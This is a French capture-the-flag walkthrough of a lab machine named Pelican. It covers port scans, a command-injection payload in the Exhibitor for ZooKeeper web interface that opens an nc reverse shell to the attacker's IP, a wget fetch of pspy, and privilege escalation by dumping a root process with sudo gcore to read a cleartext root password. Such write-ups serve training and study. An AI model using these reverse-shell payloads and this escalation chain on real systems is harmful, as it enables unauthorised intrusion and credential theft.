  # Pelican

	sudo masscan -p1-65535,U:1-65535 192.168.164.98 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 192.168.164.98 -oN nmap.txt
	feroxbuster --silent -u http://192.168.164.98:8080
	
Scans classiques.

    PORT STATE SERVICE VERSION  
    22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)  
    139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)  
    445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)  
    631/tcp open ipp CUPS 2.2  
    2181/tcp open zookeeper Zookeeper 3.4.6-1569965 (Built on 02/20/2014)  
    2222/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)  
    8080/tcp open http Jetty 1.0  
    8081/tcp open http nginx 1.14.2  
    41665/tcp open java-rmi Java RMI

Rien sur le site du port 8080 mais le site du port 8081 redirige directement vers http://192.168.164.98:8080/exhibitor/v1/ui/index.html

Exploit : https://www.exploit-db.com/exploits/48654

Payload à injecter dans "java.env script" : 

    $(/bin/nc -e /bin/sh 192.168.45.214 443 &)

 Commit => All At Once => OK

Attendre une minute pour que la connexion arrive.

	rlwrap nc -nvlp 443
	...
	cd ~
	cat local.txt

Élévation de privilèges : 

	python -c 'import pty ; pty.spawn("/bin/bash")'
	find / -perm /4000 2>/dev/null
	cat /etc/crontab

Je vois deux tâches planifiées très intéressantes : 

    @reboot root /usr/bin/password-store  
    @reboot root while true; do chown -R charles:charles /opt/zookeeper && chown -R charles:charles /opt/exhibitor && sleep 1; done

Mais il n'y a pas les droits sur le fichier /usr/bin/password-store contrairement à ce que je pensais. En revanche cela m'a fait penser à Pspy et à la possibilité d'espionner ces tâches : 

	nc -e /bin/bash 192.168.45.214 9999 &
	wget http://192.168.45.214/pspy64
	chmod u+x pspy64
	./pspy64

Pas de résultats.

Mais en lançant LinPEAS j'ai vu ce que Charles pouvait lancer en tant que root même si je n'avais pas son mot de passe : 

	

> User charles may run the following commands on pelican:  
:  
(ALL) NOPASSWD: /usr/bin/gcore

Plus qu'à exploiter cela, en repensant aux tâches planifiées trouvées plus tôt.
Voir : https://gtfobins.github.io/gtfobins/gcore/#sudo

	ps -aux | grep password-store
	sudo gcore 527
	ls
	strings core.527

On retrouve bien le mot de passe de root dans le dump du processus : 

> 001 Password: root:  
ClogKingpinInning731  
x86_64  
/usr/bin/password-store

	su - 
	cat /root/proof.txt
	

